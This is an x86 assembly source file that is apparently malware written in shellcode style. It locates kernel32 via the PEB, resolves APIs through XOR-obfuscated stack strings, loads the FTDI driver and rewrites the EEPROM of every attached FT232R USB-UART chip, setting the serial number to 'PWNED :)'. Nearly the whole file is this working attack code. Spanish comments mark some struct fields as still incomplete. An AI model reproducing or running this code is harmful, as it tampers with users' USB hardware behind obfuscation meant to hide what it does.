;The MIT License (MIT)

;Copyright (c) 2024 David Reguera Garcia aka Dreg & Ivan Redondo aka S0S4

;Permission is hereby granted, free of charge, to any person obtaining a copy
;of this software and associated documentation files (the "Software"), to deal
;in the Software without restriction, including without limitation the rights
;to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
;copies of the Software, and to permit persons to whom the Software is
;furnished to do so, subject to the following conditions:

;The above copyright notice and this permission notice shall be included in all
;copies or substantial portions of the Software.

;THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
;IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
;FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
;AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
;LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
;OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
;SOFTWARE.


; By: @S0S4 & Dreg
; github.com/therealdreg

; Macro to create empty space on the stack

%macro memset 3
    mov ecx, %1
    mov edi, %2
    mov al, %3
    cld
; %%repeat:
    rep stosb
;    loop  %%repeat
%endmacro

%macro bzero 2
     memset %1, %2, 0x00
%endmacro

%macro allocstackz 1
     sub esp, %1
     bzero %1, esp
%endmacro

; A macro to push a zero onto the stack using a roundabout method (for obfuscation)
%macro push_0 0
    push 0x69
    xor byte [esp], 0x69
%endmacro 

; A macro to find the base address of kernel32.dll using the Process Environment Block (PEB)
%macro  FindKernel32Base 0
    mov edi, [fs:ebx+0x30]  ; Load PEB into EDI
    mov edi, [edi+0x0c]     ; Access the loader data
    mov edi, [edi+0x1c]     ; First module in the module list

    %%module_loop:
    mov eax, [edi+0x08]     ; Get the next module
    mov esi, [edi+0x20]     ; Module name pointer
    mov edi, [edi]          ; Move to next module
    cmp byte [esi+12], '3'  ; Check if this is the kernel32 module
    jne %%module_loop       ; Loop until kernel32.dll is found
%endmacro 

global WinMain  ; Declare the entry point of the application

section .text   ; Start of the code section
WinMain:

xor ebx, ebx    ; Zero out EBX

FindKernel32Base  ; Execute the macro to find kernel32 base

mov edi, eax    ; Store kernel32 base in EDI
add edi, [eax+0x3c]  ; PE header offset

mov edx, [edi+0x78]  ; Export table offset
add edx, eax         ; Adjust EDX to point to the export table

mov edi, [edx+0x20]  ; AddressOfNames
add edi, eax         ; Adjust EDI to point to names

mov ebp, ebx         ; Clear EBP for loop counter
name_loop:
mov esi, [edi+ebp*4]  ; Get function name
add esi, eax          ; Adjust address
inc ebp
cmp dword [esi], 0x50746547 ; "GetP"
jne name_loop
cmp dword [esi+8], 0x65726464 ; "ddre"
jne name_loop

mov edi, [edx+0x24]  ; AddressOfNameOrdinals
add edi, eax
mov bp, [edi+ebp*2]  ; Get the ordinal

mov edi, [edx+0x1C]  ; AddressOfFunctions
add edi, eax
mov edi, [edi+(ebp-1)*4] ; Subtract ordinal base
add edi, eax

; EDI now contains GetProcAddress address, EAX is kernel32.dll base address


; edi GetProcAddress address
; eax kernel32.dll base address

; Push parameters for LoadLibraryA using obfuscated zero push
push_0 
push 0x41797261       ; "Arya"
push 0x7262694C       ; "rbiL"
push 0x64616F4C       ; "daoL"
push esp              ; Push pointer to "LoadLibraryA"

push eax
xchg eax, esi
call edi              ; Call GetProcAddress

; esi kernel32.dll base address
; edi GetProcAddress address
; eax LoadLibraryA address

; Now, EAX contains the address of LoadLibraryA
add  esp, 4*4         ; Clean up the stack

push esi              ; Push base addresses and proc addresses for later use
push edi
push eax

; Push parameters for ExitProcess using similar obfuscation
push 0x69737365       ; "isse"
xor byte [esp+3], 0x69
push 0x636F7250       ; "corP"
push 0x74697845       ; "tixE"
push esp              ; Push pointer to "ExitProcess"

push esi
call edi              ; Call GetProcAddress

add  esp, 4*3
push eax              ; Push address of ExitProcess


; [esp] ExitProcess
; [esp+0x4] LoadLibraryA
; [esp+0x8] GetProcAddress
; [esp+0x0C] kernel32 base address 


; Push parameters for FTD2XX.dll loading
push 0x69696c6c       ; "iill"
xor word [esp+2], 0x69
push 0x642e5858       ; "d.XX"
push 0x32445446       ; "2DTF"
push esp              ; Pointer to "FTD2XX.dll"
call [esp+0x14]       ; Call LoadLibraryA

add  esp, 4*3
push eax              ; Push base address of FTD2XX.dll

; [esp] FTD2XX.dll base address
; [esp+0x4] ExitProcess
; [esp+0x8] LoadLibraryA
; [esp+0x0c] GetProcAddress
; [esp+0x10] kernel32 base address 

; Push parameters for FT_CreateDeviceInfoList
push 0x69747369       ; "itsi"
xor byte [esp+3], 0x69
push 0x4C6F666E       ; "Lofn"
push 0x49656369       ; "Ieci"
push 0x76654465       ; "veDe"
push 0x74616572       ; "taer"
push 0x435F5446       ; "C_FT"
push esp              ; Pointer to "FT_CreateDeviceInfoList"
push dword [esp+0x1c] ; Adjust stack
call [esp+0x2C]       ; Call GetProcAddress

add  esp, 4*6              ; Push address of FT_CreateDeviceInfoList
push_0
push esp
call eax
pop esi	; Save number of devices

test eax, eax 
jne exit

; Get LocalAlloc address
push_0
push 0x0000636F ; co
push 0x6C6C416C ; llAl
push 0x61636F4C ; acoL
push esp
push DWORD [esp+0x24] ; Kernel32 base address 
call [esp+0x24]
add esp, 4*4
push eax

; LocallAlloc
mov eax, 0x64 
imul eax,esi
push eax
push_0 
call [esp+8]
add esp, 4*1
push eax 

; Get FT_GetDeviceInfoList Address
push_0
push 0x7473694C ; tsiL
push 0x6F666E49 ; ofnI
push 0x65636976 ; eciv
push 0x65447465 ; eDte
push 0x475F5446 ; G_TF
push esp
push DWORD [esp+0x20] ; FTDI Driver base address 
call [esp+0x30]
add esp, 4*6

; FT_GetDeviceInfoList

device_loop:
	push_0
	push esi ;numDevs
	push esp 
	push DWORD [esp+0x0C]
	call eax
	test eax,eax
	jne exit
	mov eax, [esp+0x8]
	mov ebx, [eax+8]
	cmp ebx, 0x04036001
	jne exit
	add esp, 4*2
	
	; FT_OpenEx address 
	
	push_0
	push 0x00000078 ; X
	push 0x456E6570 ; Enep
	push 0x4F5F5446  ; O_TF
	push esp 
	push DWORD [esp+0x18]
	call [esp+0x28]
	
	; Call FT_OpenEx 
	
	push_0
	push 0x00545241 ; TRA
	push 0x55204253 ; U BS
	push 0x55205232 ; U R2
	push 0x33325446 ; 32TF
	push esp
	push esp 
	add DWORD [esp], 0x14
	push 0x2 ; FT_OPEN_BY_NAME
	push esp
	add DWORD [esp], 0xC
	call eax
	mov  DWORD eax, [esp+4*5]
	add esp, 4*11
	push eax
	
	
	; FT_EE_PROGRAM ADDRESS 
	push_0
	push 0x0000006D                                                                                                         
	push 0x6172676F                                                                                                         
	push 0x72505F45                                                                                                         
	push 0x455F5446
	push esp 
	push DWORD [esp+0x1C]
	call [esp+0x2C]
	push eax 
	push_0
	

	; FT_EE_PROGRAM 
	
	; ManufacturerBuf
	allocstackz 0x20 
	mov DWORD [esp], 0x49445446
	push esp 
	; ManufacturerIdBuf 
	allocstackz 0x10
	mov WORD [esp], 0x3141
	push esp
	; DescriptionBuf 
	allocstackz 0x40
	mov DWORD [esp],   0x33325446 
	mov DWORD [esp+0x4], 0x55205232
	mov DWORD [esp+0x8], 0x55204253
	mov DWORD [esp+0xC], 0x545241
	push esp
	; SerialNumberBuf
	allocstackz 0x10
	mov DWORD [esp], 0x454E5750
	mov DWORD [esp+0x4], 0x293A2044
	push esp
    
	push dword 0x90909090
    push dword 0x90909090
    push dword 0x90909090
    push dword 0x90909090
    push dword 0x00000000
    push dword 0x00000000
    push dword 0x00000000
    push dword 0x00000000
    push dword 0x00000000
    push dword 0x00000000
    push dword 0x00000000
    push dword 0x00000000
    push dword 0x00000000
    push dword 0x00000000
    push dword 0x00000000
    push dword 0x00000000
    push dword 0x00000000
    push dword 0x00000005
    push dword 0x00000203
    push dword 0x00000001
    push dword 0x00400001
    push dword 0x00000000
    push dword 0x00000010
    push dword 0x00000000
    push dword 0x01000000
    push dword 0x00000100
    push dword 0x00015A00
    push dword 0x00000000 ; EN ESTAS DIRECCIONES TIENE QUE ESTAR DIRECCIONES QUE APUNTEN A STRINGS COMO EN EL PROGRAMA DE C
    lea eax, [esp+0x6C]
	add eax, 0x4
	mov ecx, [eax]
	mov [esp], ecx 
	push dword 0x00000000 ; EN ESTAS DIRECCIONES TIENE QUE ESTAR DIRECCIONES QUE APUNTEN A STRINGS COMO EN EL PROGRAMA DE C
	add eax, 0x14
	mov ecx, [eax]
	mov [esp], ecx 
    push dword 0x00000000 ; EN ESTAS DIRECCIONES TIENE QUE ESTAR DIRECCIONES QUE APUNTEN A STRINGS COMO EN EL PROGRAMA DE C
    add eax, 0x44
	mov ecx, [eax]
	mov [esp], ecx 
	push dword 0x00000000 ; EN ESTAS DIRECCIONES TIENE QUE ESTAR DIRECCIONES QUE APUNTEN A STRINGS COMO EN EL PROGRAMA DE C
	add eax, 0x14
	mov ecx, [eax]
	mov [esp], ecx 
    push dword 0x60010403
	push byte 0x2
    push dword 0xFFFFFFFF
    push dword 0x00000000

	push esp 
	mov ebx, [esp+0x13C]
	push ebx
	call [esp+0x128]
	

	cmp eax, 0
	jne exit
	add esp, 0x138
	
	
	; FT_CLOSE ADDRESS 
	push_0
	push 0x65736F6C                                                                                                         
	push 0x435F5446
	push esp 
	push DWORD [esp+0x14]
	call [esp+0x24]
	add esp, 4*3
	
	; FT_CLOSE 
	call eax
		
next_loop:
	
	dec esi
	cmp esi, 0
	jne device_loop
	call [esp+0x4]        ; Call ExitProcess to end the program

exit:
	call [esp+0x10]
